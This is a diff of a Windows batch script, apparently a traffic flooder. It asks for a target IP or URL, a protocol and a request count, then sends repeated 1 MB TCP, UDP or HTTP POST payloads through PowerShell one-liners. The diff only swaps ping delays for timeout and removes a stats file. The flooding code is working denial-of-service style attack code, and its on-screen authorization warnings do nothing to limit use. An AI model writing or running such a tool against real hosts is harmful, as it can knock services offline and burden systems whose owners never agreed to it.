@@ -18,7 +18,7 @@ echo ======================================================
 echo WARNING: This script generates real network traffic.
 echo Use only in a controlled environment with proper authorization.
 echo Targeting unauthorized systems is illegal and unethical.
-ping localhost -n 5 >nul
+timeout /t 5 >nul
 
 :: Main Menu
 :menu
@@ -48,7 +48,7 @@ echo Example: 192.168.1.1 or http://example.com
 set /p target=Target: 
 if "%target%"=="" (
     echo Target cannot be empty! Try again.
-    ping localhost -n 2 >nul
+    timeout /t 2 >nul
     goto target_input
 )
 
@@ -74,7 +74,7 @@ if %is_ip%==1 (
     if "%protocol%"=="2" set protocol=UDP
     if not "%protocol%"=="TCP" if not "%protocol%"=="UDP" (
         echo Invalid protocol! Try again.
-        ping localhost -n 2 >nul
+        timeout /t 2 >nul
         goto protocol_input
     )
 )
@@ -89,12 +89,12 @@ echo Enter the number of packets/requests to send (1-1000):
 set /p packets=Packets/Requests: 
 if %packets% LSS 1 (
     echo Minimum packets/requests is 1. Try again.
-    ping localhost -n 2 >nul
+    timeout /t 2 >nul
     goto packet_input
 )
 if %packets% GTR 1000 (
     echo Maximum packets/requests is 1000. Try again.
-    ping localhost -n 2 >nul
+    timeout /t 2 >nul
     goto packet_input
 )
 
@@ -123,18 +123,11 @@ goto get_confirm
 :start_traffic
 cls
 echo Starting traffic generation to %target%...
-ping localhost -n 2 >nul
+timeout /t 2 >nul
 
 :: Initialize counters
 set /a packets_sent=0
 set /a total_bytes=0
-
-:: Create a temporary file to store stats
-echo Packets/Requests Sent: 0 > stats.txt
-echo Data Sent: 0 MB (0 GB) >> stats.txt
-
-:: Open the stats file in Notepad
-start notepad stats.txt
 
 :: Main traffic generation loop
 :traffic
@@ -155,14 +148,12 @@ echo =========================
 
 :: Send traffic based on target type
 if %is_ip%==1 (
-    :: Send large TCP/UDP packets to IP address
     if "%protocol%"=="TCP" (
         powershell -Command "$client = New-Object System.Net.Sockets.TcpClient('%target%', 80); $stream = $client.GetStream(); $buffer = New-Object Byte[] 1048576; $stream.Write($buffer, 0, 1048576); $stream.Close(); $client.Close();"
     ) else if "%protocol%"=="UDP" (
         powershell -Command "$client = New-Object System.Net.Sockets.UdpClient('%target%', 80); $buffer = New-Object Byte[] 1048576; $client.Send($buffer, 1048576); $client.Close();"
     )
 ) else (
-    :: Send large HTTP requests (TCP-based) to website
     powershell -Command "$webRequest = [System.Net.WebRequest]::Create('%target%'); $webRequest.Method = 'POST'; $webRequest.ContentLength = 1048576; $stream = $webRequest.GetRequestStream(); $buffer = New-Object Byte[] 1048576; $stream.Write($buffer, 0, 1048576); $stream.Close(); $response = $webRequest.GetResponse(); $response.Close();"
 )
 
